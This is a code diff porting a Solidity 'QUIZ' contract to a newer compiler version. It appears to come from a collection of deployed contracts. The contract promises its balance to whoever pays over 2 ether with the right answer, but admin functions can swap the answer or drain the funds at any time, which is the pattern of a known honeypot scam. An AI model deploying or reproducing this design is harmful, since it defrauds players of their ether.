@@ -1,54 +1,57 @@
-pragma solidity ^0.4.25;
+pragma solidity ^0.8.30;
 
-//TODO Remover os keccaks e hashs
 //0x896b0b5b747a91125f212c2ed666fb773e49c097.sol
 contract QUIZ {
-    function Try(string _response) external payable {
+    function Try(string memory _response) external payable {
         require(msg.sender == tx.origin);
 
-        if (responseHash == keccak256(_response) && msg.value > 2 ether) {
-            msg.sender.transfer(this.balance);
+        // if response == _response and msg.value > 2 ether, then transfer the balance to the sender
+        if (
+            keccak256(abi.encodePacked(response)) ==
+            keccak256(abi.encodePacked(_response)) &&
+            msg.value > 2 ether
+        ) {
+            payable(msg.sender).transfer(address(this).balance);
         }
     }
 
     string public question;
 
-    bytes32 responseHash;
+    string response;
 
-    mapping(bytes32 => bool) admin;
+    mapping(address => bool) admin;
 
-    function Start(string _question, string _response) public payable isAdmin {
-        if (responseHash == 0x0) {
-            responseHash = keccak256(_response);
+    function Start(
+        string memory _question,
+        string memory _response
+    ) public payable isAdmin {
+        response = _response;
 
-            question = _question;
-        }
+        question = _question;
     }
 
     function Stop() public payable isAdmin {
-        msg.sender.transfer(this.balance);
+        payable(msg.sender).transfer(address(this).balance);
     }
 
     function New(
-        string _question,
-        bytes32 _responseHash
+        string memory _question,
+        string memory _response
     ) public payable isAdmin {
         question = _question;
 
-        responseHash = _responseHash;
+        response = _response;
     }
 
-    constructor(bytes32[] admins) public {
+    constructor(address[] memory admins) {
         for (uint256 i = 0; i < admins.length; i++) {
             admin[admins[i]] = true;
         }
     }
 
     modifier isAdmin() {
-        require(admin[keccak256(msg.sender)]);
+        require(admin[msg.sender]);
 
         _;
     }
-
-    function() public payable {}
 }
